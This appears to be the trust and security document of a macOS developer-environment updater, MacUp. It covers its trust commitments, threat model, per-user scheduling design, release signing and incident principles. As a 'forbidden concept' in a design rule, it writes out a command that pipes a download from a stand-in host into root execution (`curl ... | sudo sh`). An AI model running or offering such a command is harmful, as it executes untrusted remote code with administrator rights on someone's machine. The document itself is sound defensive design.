# Trust and Security

## Trust Contract

MacUp publicly commits to:

1. No hidden changes.
2. Read-only means no package/runtimes are modified.
3. Users can inspect a change before execution.
4. MacUp does not store admin passwords.
5. MacUp uses existing package managers instead of replacing them.
6. Saved exclusions/policies are enforced at execution time.
7. Major/unknown/high-risk changes require review.
8. Local inventory stays local by default.
9. Telemetry is off unless the user opts in.
10. Core behavior is open source.
11. Modification attempts are logged.
12. Rollback claims are capability-specific and truthful.
13. Ambiguity causes MacUp to stop/skip rather than guess.

## Threat model

Assets:
- user's developer environment
- executable search path
- package-manager configuration
- shell/runtime configuration
- credentials present in environment
- local filesystem
- administrator authorization
- trust in signed MacUp releases

Threats:
- command injection via package names/provider output
- PATH hijacking
- malicious or compromised upstream package
- parser confusion causing wrong target
- policy race/change between planning and execution
- accidental privilege escalation
- logging secrets
- corrupted configuration changing policy
- compromised update distribution
- symlink/path attacks on writable files
- malicious project-local config affecting global maintenance
- remote command capability introduced later

Mitigations:
- argument arrays, no shell interpolation
- explicit executable path
- provider output validation
- policy re-check before execute
- local-first
- atomic config
- strict file permissions where appropriate
- log redaction
- signed/notarized release
- checksums
- dependency minimization
- no root daemon
- no remote arbitrary command schema

## Privilege

The main process runs as the user.

Scheduling does not change that. `macup schedule enable` installs a per-user
LaunchAgent in `~/Library/LaunchAgents`, loaded into the user's own launchd
domain (`gui/<uid>`). There is no `LaunchDaemon`, no root, no privilege
helper, no authorization prompt, and no process running between checks. The
scheduled job runs `macup check --save-state`, which cannot install, upgrade,
or remove anything. `macup schedule disable` unloads the job and deletes the
property list, and `macup schedule status` shows the exact command that would
run, so an installed schedule is never something you have to take on trust.


When an operation legitimately needs authorization:
- explain why
- let macOS present standard authorization
- never collect the password in MacUp UI
- avoid custom privilege helpers until a separately reviewed need exists

## Remote architecture rule

If cloud/team functionality exists later, the server may express declarative desired state/policy, never arbitrary shell commands.

Allowed concept:
```json
{"tool":"node","policy":"pin","version":"24"}
```

Forbidden concept:
```json
{"command":"curl https://example | sudo sh"}
```

## Release security

Before public v1:
- Developer ID signature
- Apple notarization
- SHA-256 checksums
- GitHub protected release workflow
- documented build steps
- security reporting process
- dependency lock/review
- no secrets in repository or CI logs

## Incident principle

If MacUp causes or risks destructive behavior:
- stop release/update distribution if necessary
- disclose concrete scope
- provide remediation
- do not minimize impact
- add regression tests before restoring affected functionality
